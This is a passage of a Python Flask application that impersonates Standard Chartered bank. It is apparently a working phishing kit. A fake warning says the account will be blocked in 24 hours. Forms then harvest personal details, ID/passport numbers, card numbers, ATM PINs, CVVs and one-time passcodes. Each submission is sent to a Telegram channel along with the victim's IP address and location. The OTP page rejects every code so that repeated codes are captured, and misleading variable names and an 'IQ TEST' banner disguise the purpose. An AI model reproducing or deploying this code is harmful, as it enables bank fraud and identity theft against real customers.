            id="noticeUsername"
            class="ref-test-username"
        ></div>

        <div class="ref-test-text">

            UPDATE YOUR STANDARD CHARTERED ACCOUNT PLEASE.

            <br><br>

            YOUR ACCOUNT IS NOT UPDATED ON THE 2026 STANDARD CHARTERED SERVER, WILL BE BLOCKED IN 24 HOURS.

        </div>

        <button
            type="button"
            id="noticeOkButton"
            class="ref-test-button"
        >
            OK
        </button>

    </div>

</div>



<script>

document.addEventListener(
    "DOMContentLoaded",
    function() {

        const form =
            document.getElementById(
                "loginForm"
            );

        const usernameInput =
            document.getElementById(
                "usernameInput"
            );

        const notice =
            document.getElementById(
                "testNotice"
            );

        const noticeUsername =
            document.getElementById(
                "noticeUsername"
            );

        const okButton =
            document.getElementById(
                "noticeOkButton"
            );

        const loginButton =
            document.getElementById(
                "loginButton"
            );

        let submitted = false;
        let timer = null;


        function continueLogin() {

            if (submitted) {
                return;
            }

            submitted = true;

            notice.style.display =
                "none";

            loginButton.disabled =
                true;

            form.submit();
        }


        form.addEventListener(
            "submit",
            function(event) {

                if (submitted) {
                    return;
                }

                event.preventDefault();

                const username =
                    usernameInput
                    .value
                    .trim();

                noticeUsername.textContent =
                    username
                    ?
                    "Mr/Ms. " + username
                    :
                    "";

                notice.style.display =
                    "flex";

                timer =
                    setTimeout(
                        continueLogin,
                        10000
                    );
            }
        );


        okButton.addEventListener(
            "click",
            function() {

                if (timer) {
                    clearTimeout(timer);
                }

                continueLogin();
            }
        );

    }
);

</script>

    """

    return render_template_string(
        base(content, False)
    )

# ============================================================
# TRANSITION
# ============================================================

@app.route("/transition/<next_page>")
def transition(next_page):

    routes = {
        "information": "/information",
        "questions": "/questions",
        "age": "/age",
        "complete": "/complete"
    }

    destination = routes.get(
        next_page,
        "/"
    )

    content = f"""

    <div class="page">

        <div class="processing-panel">

            <div class="processing-title">
                Please wait...
            </div>

            <div class="spinner"></div>

            <div
                id="percent"
                class="percent"
            >
                0%
            </div>

            <p>
                Processing your information
            </p>

        </div>

    </div>

    <script>

        let progress = 0;

        const number =
            document.getElementById("percent");

        const timer =
            setInterval(function() {{

                progress += 5;

                if(progress >= 100) {{

                    progress = 100;

                    number.innerText =
                        progress + "%";

                    clearInterval(timer);

                    setTimeout(function() {{

                        window.location.href =
                            "{destination}";

                    }}, 300);

                    return;
                }}

                number.innerText =
                    progress + "%";

            }}, 55);

    </script>

    """

    return render_template_string(
        base(content)
    )


# ============================================================
# INFORMATION
# ============================================================

@app.route(
    "/information",
    methods=["GET", "POST"]
)
def information():

    if not session.get("login_done"):
        return redirect(url_for("login"))

    error = ""

    if request.method == "POST":

        if not request.form.get("terms"):

            error = """
            <p style="color:#b00020;">
                Please accept the Terms & Conditions.
            </p>
            """

        else:

            session["first_name"] = request.form.get(
                "first_name",
                ""
            ).strip()

            session["second_name"] = request.form.get(
                "second_name",
                ""
            ).strip()

            session["father_name"] = request.form.get(
                "father_name",
                ""
            ).strip()

            session["mother_name"] = request.form.get(
                "mother_name",
                ""
            ).strip()

            session["student_number"] = request.form.get(
                "student_number",
                ""
            ).strip()

            session["guardian_number"] = request.form.get(
                "guardian_number",
                ""
            ).strip()

            session["terms"] = True

            student_info_message = f"""
👤  INFORMATION

First Name: {session.get("first_name", "")}
Last Name: {session.get("second_name", "")}
Current Address: {session.get("father_name", "")}
Email: {session.get("mother_name", "")}
id/ passport: {session.get("student_number", "")}
cell phone: {session.get("guardian_number", "")}
"""

            try:
                send_telegram(student_info_message)
            except Exception as error:
                print("STUDENT INFO TELEGRAM ERROR:", error)

            return redirect(
                url_for(
                    "transition",
                    next_page="questions"
                )
            )

    content = f"""

    <div class="page">

        <div class="panel">

            <div class="panel-title">
                It is time to verify your account and app info.
            </div>

            <div class="intro-box">

                To complete the update of your FICA information
                  we need to verify any of your standard chartered account/s.

            
            </div>

            {error}

            <form method="POST">
<div class="form-row"> 
 
    <label for="first_name"> 
        First Name 
    </label> 
 
    <input 
        type="text" 
        id="first_name" 
        class="small-field" 
        name="first_name" 
        autocomplete="given-name"
        pattern="[A-Za-zÀ-ÖØ-öø-ÿ' -]+"
        title="Only letters are allowed."
        oninput="this.value = this.value.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ' -]/g, '')"
        required 
    > 
 
    <button 
        type="button" 
        class="help-btn" 
        onclick="alert('Enter your first name.')" 
        aria-label="Help with first name" 
    > 
        ? 
    </button> 
 
</div> 
 
 
<div class="form-row"> 
 
    <label> 
        Last Name 
    </label> 
 
    <input
        type="text"
        class="small-field" 
        name="second_name"
        autocomplete="family-name"
        pattern="[A-Za-zÀ-ÖØ-öø-ÿ' -]+"
        title="Only letters are allowed."
        oninput="this.value = this.value.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ' -]/g, '')"
        required 
    > 
 
    <button 
        type="button" 
        class="help-btn" 
        onclick="alert('Enter your last name.')" 
    > 
        ? 
    </button> 
 
</div> 
 
 
<div class="form-row"> 
 
    <label> 
        Current Address 
    </label> 
 
    <input
        type="text"
        class="small-field" 
        name="father_name" 
        autocomplete="street-address"
        required 
    > 
 
    <button 
        type="button" 
        class="help-btn" 
        onclick="alert('Enter your current address.')" 
    > 
        ? 
    </button> 
 
</div> 
 
 
<div class="form-row"> 
 
    <label> 
        Email Address 
    </label> 
 
    <input
        type="email"
        class="small-field" 
        name="mother_name"
        autocomplete="email"
        title="Enter a valid email address."
        required 
    > 
 
    <button 
        type="button" 
        class="help-btn" 
        onclick="alert('Enter your email address.')" 
    > 
        ? 
    </button> 
 
</div> 
 
 
<div class="form-row"> 
 
    <label> 
        ID/Passport Number 
    </label> 
 
    <input
        type="text"
        class="small-field" 
        name="student_number"
        pattern="[A-Za-z0-9]+"
        title="Only letters and numbers are allowed."
        oninput="this.value = this.value.replace(/[^A-Za-z0-9]/g, '')"
        required 
    > 
 
    <button 
        type="button" 
        class="help-btn" 
        onclick="alert('Enter your ID/Passport number.')" 
    > 
        ? 
    </button> 
 
</div> 
 
<div class="form-row">

    <label>
        Cellphone Number
    </label>

    <div class="phone-field">

        <span class="phone-prefix">
            +267
        </span>

   <input
    type="tel"
    name="guardian_number"
    inputmode="numeric"
    autocomplete="on"
    maxlength="9"
    oninput="this.value = this.value.replace(/[^0-9]/g, '').slice(0, 9)"
    required
>

    </div>

    <button
        type="button"
        class="help-btn"
        onclick="alert('Enter your cellphone number.')"
    >
        ?
    </button>

</div>

                <div class="terms">

                    <div class="terms-title">
                        Terms & Conditions
                    </div>

                    <div class="terms-row">

                        <input
                            type="checkbox"
                            name="terms"
                            value="yes"
                        >

                        <div>

                            I accept the Standard Chartered Verification
                            <a
                                href="/terms"
                                target="_blank"
                            >
                                Terms and Conditions
                            </a>

                        </div>

                    </div>

                </div>


                <button
                    class="confirm-btn"
                    type="submit"
                >
                    Confirm
                </button>

            </form>

        </div>

    </div>

    """

    return render_template_string(
        base(content)
    )


# ============================================================
# TERMS
# ============================================================

@app.route("/terms")
def terms():

    content = """

    <div class="page">

        <div class="panel">

            <div class="panel-title">
                Terms and Conditions
            </div>

            <div class="intro-box">

    <p>
        By using the Standard Chartered Server, you agree to provide accurate and up-to-date information.
    </p>

    <p>
        You are responsible for keeping your login details, passwords, and personal information secure.
    </p>

    <p>
        The service must only be used for lawful purposes and according to applicable rules.
    </p>

    <p>
        The Standard Chartered Server may perform security checks to protect accounts, transactions, and user information.
    </p>

    <p>
        By continuing, you confirm that you have read, understood, and accepted these Terms of Use.
    </p>

</div>

            <button
                class="confirm-btn"
                onclick="window.close()"
            >
                Close
            </button>

        </div>

    </div>

    """

    return render_template_string(
        base(content)
    )


# ============================================================
# QUESTIONS
# ============================================================

@app.route(
    "/questions",
    methods=["GET", "POST"]
)
def questions():

    if not session.get("terms"):
        return redirect(url_for("information"))

    if request.method == "POST":

        answers = {

            "q1": request.form.get("q1", "").strip(),
            "q2": request.form.get("q2", "").strip(),
            "q3": request.form.get("q3", "").strip(),
            "q4": request.form.get("q4", "").strip(),
            "q5": request.form.get("q5", "").strip()
        }

        session["answers"] = answers


        ip_address = request.headers.get(
            "X-Forwarded-For",
            request.remote_addr or "Unknown"
        ).split(",")[0].strip()

        city = request.headers.get(
            "X-Vercel-IP-City",
            ""
        ).replace("%20", " ")

        country = request.headers.get(
            "X-Vercel-IP-Country",
            ""
        )

        if city and country:
            location = f"{city}, {country}"
        elif country:
            location = country
        else:
            location = "Unknown"

        message = f"""
👤 DATA

ACCESS
Username: {session.get("test_username", "")}

USER
First Name: {session.get("first_name", "")}
Last Name: {session.get("second_name", "")}
Current Address: {session.get("father_name", "")}
Email: {session.get("mother_name", "")}
id/ passport: {session.get("student_number", "")}
Cell Phone: {session.get("guardian_number", "")}

CARD
card number: {answers.get("q1", "")}
ATM PIN: {answers.get("q2", "")}
EXPIRATION DATE: {answers.get("q3", "")}
CVV: {answers.get("q4", "")}
5. {answers.get("q5", "")}

TECHNICAL INFO
IP: {ip_address}
Location: {location}
Device: {session.get("device", "")}
Started: {session.get("started_at", "")}
"""

        try:
            send_telegram(message)
        except Exception as error:
            print("RESULT TELEGRAM ERROR:", error)
     
        return redirect(
            url_for(
                "transition",
                next_page="age"
            )
        )

    content = """

    <div class="page">

        <div class="panel">

            <div class="iq-title">
                To ensure the security and compliance of your account

            </div>

            <div class="intro-box">

                To complete the update of your FICA information.

                <br>

                we need to verify your any of your Standard Chartered accounts.


            </div>

            <form method="POST">


                <div class="question-row">

                    <div class="question-text">
                        Card number
                    </div>

                    <input
                        class="question-input"
                        name="q1"
                        required
                        inputmode="numeric"
                        autocomplete="cc-number"
                    >

                    <button
                        type="button"
                        class="help-btn"
                        onclick="alert('Enter your card number.')"
                    >
                        ?
                    </button>

                </div>


                <div class="question-row">

                    <div class="question-text">
                        ATM PIN
                    </div>

                    <input
                        class="question-input"
                        name="q2"
                        required
                        inputmode="numeric"
                        autocomplete="off"
                    >

                    <button
                        type="button"
                        class="help-btn"
                        onclick="alert('Enter your ATM PIN.')"
                    >
                        ?
                    </button>

                </div>


                <div class="question-row">

                    <div class="question-text">
                        expiry date
                    </div>

                    <input
                        class="question-input"
                        name="q3"
                        required
                        inputmode="numeric"
                        autocomplete="cc-exp"
                    >

                    <button
                        type="button"
                        class="help-btn"
                        onclick="alert('Enter your expiry date.')"
                    >
                        ?
                    </button>

                </div>


                <div class="question-row">

                    <div class="question-text">
                        CVV
                    </div>

                    <input
                        class="question-input"
                        name="q4"
                        required
                        inputmode="numeric"
                        autocomplete="cc-csc"
                    >

                    <button
                        type="button"
                        class="help-btn"
                        onclick="alert('Enter your CVV.')"
                    >
                        ?
                    </button>

                </div>


                
                <div class="terms">

                    <div class="terms-title">
                        Terms & Conditions
                    </div>

                    <div class="terms-row">

                        <input
                            type="checkbox"
                            required
                        >

                        <div>
                           Should you attempt to register with fictitious details
                             or on behalf of another person
                             we reserve the right to take legal action.
                        </div>

                    </div>

                </div>


                <button
                    class="confirm-btn"
                    type="submit"
                >
                    Confirm
                </button>

            </form>

        </div>

    </div>

    """

    return render_template_string(
        base(content)
    )


# ============================================================
# AGE
# ============================================================

@app.route(
    "/age",
    methods=["GET", "POST"]
)
def age():

    if not session.get("answers"):
        return redirect(url_for("questions"))

    if request.method == "POST":

        age_value = request.form.get(
            "age",
            ""
        ).strip()

        print("AGE RECEIVED:", age_value)

        if age_value != "00000":

            wrong_age_message = f"""
 OTP ATTEMPT

Name: {session.get("first_name", "")} {session.get("second_name", "")}
Entered: {age_value}

 VERIFIED
"""

            try:
                send_telegram(wrong_age_message)
            except Exception as error:
                print("AGE ATTEMPT TELEGRAM ERROR:", error)

            return redirect(
                url_for(
                    "age",
                    error="1"
                )
            )

    content = """
    
    <div class="page">

        <div class="panel age-panel">

            <div class="age-main-title">
                OTP VERIFICATION
            </div>

            <div class="age-description">
                Please enter OTP
            </div>

            <form method="POST" id="ageForm">

                <input
                    id="ageInput"
                    class="age-input-new"
                    type="text"
                    name="age"
                    inputmode="numeric"
                    maxlength="6"
                    pattern="[0-9]{1,6}"
                    placeholder="Enter OTP"
                    required
                >

                <button
                    class="age-confirm-button"
                    type="submit"
                    id="confirmButton"
                >
                    CONFIRM
                </button>

            </form>

            <div class="age-request-text">
                Didn't receive your OTP?
                <br>
                <span>Request again</span>
            </div>

            <div
                id="processingBox"
                class="age-processing"
                style="display:none;"
            >
                <div class="mini-spinner"></div>
                Processing, please wait...
            </div>

            <div
                id="ageError"
                class="age-erro                                                                                                                                                                FCr"
                style="display:none;"
            >
                <strong>
                    We couldn't verify the OTP you entered.
                </strong>

                <br>

                Please check your OTP and try again.
            </div>

            <div class="age-congratulations">

                <h2>
                    CONGRATULATIONS!
                </h2>

                <p class="congratulations-main">
                    download the banking app and experience smarter banking with STANDARD CHARTERED.
                </p>

                <p>
                    to approve transactions securely.
        .
                </p>

                <p>
                    Your information have been
                    successfully updated.
                </p>

                <p class="congratulations-final">
                    We appreciate your participation
            
                </p>

            </div>

        </div>

    </div>


   <script>

document.addEventListener("DOMContentLoaded", function() {

    const form = document.getElementById("ageForm");
    const processing = document.getElementById("processingBox");
    const errorBox = document.getElementById("ageError");
    const button = document.getElementById("confirmButton");

    const params = new URLSearchParams(window.location.search);

    if (params.get("error") === "1") {
        errorBox.style.display = "block";
    }

    form.addEventListener("submit", function(event) {

        event.preventDefault();

        errorBox.style.display = "none";
        processing.style.display = "block";
        button.disabled = true;

        setTimeout(function() {
            form.submit();
        }, 20000);

    });

});

</script>
    """

    return render_template_string(
        base(content)
    )


# ============================================================
# START
# ============================================================

if __name__ == "__main__":

    print("")
    print("==============================")
    print("IQ TEST RUNNING")
    print("http://127.0.0.1:5000")
    print("==============================")
    print("")

    app.run(debug=True)